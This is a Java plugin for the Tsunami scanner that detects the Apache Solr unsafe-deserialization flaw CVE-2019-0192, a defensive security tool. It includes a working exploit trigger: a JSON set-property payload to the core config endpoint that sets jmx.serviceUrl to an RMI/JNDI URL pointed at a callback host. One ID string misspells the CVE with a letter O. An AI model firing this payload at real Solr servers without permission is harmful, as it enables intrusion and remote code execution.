/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20190192;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.base.Verify.verify;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

/** A Tsunami plugin that detects the CVE-2O19-0192 in Apache Solr */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Apache Solr Unsafe Deserialization (CVE-2019-0192)",
    version = "0.1",
    description = "This plugin detects an unsafe deserialization in Apache Solr (CVE-2019-0192).",
    author = "Leonardo Giovannini (leonardo@doyensec.com)",
    bootstrapModule = ApacheSolrCve20190192BootstrapModule.class)
public final class ApacheSolrCve20190192 implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";
  @VisibleForTesting static final String VULNERABILITY_REPORT_ID = "CVE-2O19-0192";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE =
      "Apache Solr Unsafe Deserialization (CVE-2019-0192)";

  private static final String PAYLOAD_TEMPLATE = "service:jmx:rmi:///jndi/rmi://HOST/obj";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected an Apache Solr instance vulnerable to unsafe deserialization"
          + " (CVE-2019-0192). The vulnerability can be exploited by sending an unauthenticated"
          + " HTTP POST request containing a URL that points to a malicious Java RMI server. "
          + " This can easily lead to Remote Code Execution";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION_CALLBACK =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed via an out of band callback.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION = "Update the Apache Solr instance";

  @VisibleForTesting static final String CORE_ENDPOINT = "solr/admin/cores?wt=json";

  @VisibleForTesting static final String HOME_ENDPOINT = "solr";

  @VisibleForTesting static final String EXPLOIT_ENDPOINT = "solr/REPLACE/config";

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;
  private String core;

  @Inject
  ApacheSolrCve20190192(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.core = "";
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher(VULNERABILITY_REPORT_PUBLISHER)
                    .setValue(VULNERABILITY_REPORT_ID))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2019-0192"))
            .setSeverity(Severity.CRITICAL)
            .setTitle(VULNERABILITY_REPORT_TITLE)
            .setDescription(VULNERABILITY_REPORT_DESCRIPTION_CALLBACK)
            .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION)
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Apache Solr CVE-2019-0192 starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isSolr)
                .filter(this::getCore)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /*
    There is a fingerprint plugin for Apache Solr.
    However it detects only from version 5.5.1 to 9.5.0
    Since the CVE-2019-0192 can be present from version 5.0.0, i have decided to add one more layer.
  */
  private boolean isSolr(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + HOME_ENDPOINT;
    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .build();
    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
    } catch (IOException e) {
      return false;
    }
    Document doc = Jsoup.parse(response.bodyString().get());
    // Extraction the Apache Solr Version
    String solrVersion =
        doc.select("link[rel=icon]").first().attr("href").split("_")[1].split("=")[1];
    // Checking if the Apache Solr Version is a vulnerable one.
    int majorVersion = Integer.parseInt(solrVersion.split("\\.")[0]);
    if (majorVersion > 6 || majorVersion <= 4) {
      return false;
    } else {
      int minorVersion = Integer.parseInt(solrVersion.split("\\.")[1]);
      if ((majorVersion == 5 && minorVersion == 6) || minorVersion > 6) {
        return false;
      } else {
        int lastVersion = Integer.parseInt(solrVersion.split("\\.")[2]);
        if (lastVersion > 5) {
          return false;
        } else {
          return true;
        }
      }
    }
  }

  /*
   * This function is used to get a core.
   * Which is fundamental for the exploitation.
   */
  private boolean getCore(NetworkService networkService) {
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CORE_ENDPOINT;

    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .build();

    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
    } catch (IOException e) {
      return false;
    }

    // Check status code 200
    if (response.status() != HttpStatus.OK) {
      return false;
    }

    // Check if body is JSON
    if (response.bodyJson().isEmpty()) {
      return false;
    }

    JsonElement body = response.bodyJson().get();
    // Check if JSON body is object
    if (!body.isJsonObject()) {
      return false;
    }

    if (body.getAsJsonObject().get("status").toString() != "") {
      this.setCore(
          body.getAsJsonObject().get("status").getAsJsonObject().keySet().toArray()[0].toString());
      return true;
    } else {
      return false;
    }
  }

  private String getCore() {
    return core;
  }

  private void setCore(String core) {
    this.core = core;
  }

  private String getJsonPayload(String payload) {
    // Build the JSON object containing the malicious RMI instance
    JsonObject setProperty = new JsonObject();
    setProperty.addProperty("jmx.serviceUrl", payload);
    JsonObject jsonPayload = new JsonObject();
    jsonPayload.add("set-property", setProperty);

    return jsonPayload.toString();
  }

  // Checks whether a given Apache Solr instance is exposed and vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {

    // Generate the payload for the callback server
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build();

    String oobCallbackUrl = "";
    Payload payload = null;

    // Check if the callback server is available, fallback to response matching if not
    try {
      payload = this.payloadGenerator.generate(config);
      // Use callback for RCE confirmation and raise severity on success
      if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
        logger.atWarning().log("Tsunami Callback Server not available");
        return false;
      } else {
        oobCallbackUrl = payload.getPayload();
      }
    } catch (NotImplementedException e) {
      return false;
    }

    String rmiPayload = PAYLOAD_TEMPLATE.replace("HOST", oobCallbackUrl);
    String jsonPayload = getJsonPayload(rmiPayload);

    // Send the malicious HTTP request
    String targetUri =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + EXPLOIT_ENDPOINT.replace("REPLACE", this.getCore());
    logger.atInfo().log("Sending payload to '%s'", targetUri);
    HttpRequest req =
        HttpRequest.post(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
            .setRequestBody(ByteString.copyFromUtf8(jsonPayload))
            .build();

    try {
      this.httpClient.send(req, networkService);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send payload to '%s'", targetUri);
    }
    // payload should never be null here as we should have already returned in that case
    verify(payload != null);
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
      return true;
    } else {
      logger.atInfo().log(
          "Callback not received and response does not match vulnerable instance, instance is not"
              + " vulnerable.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
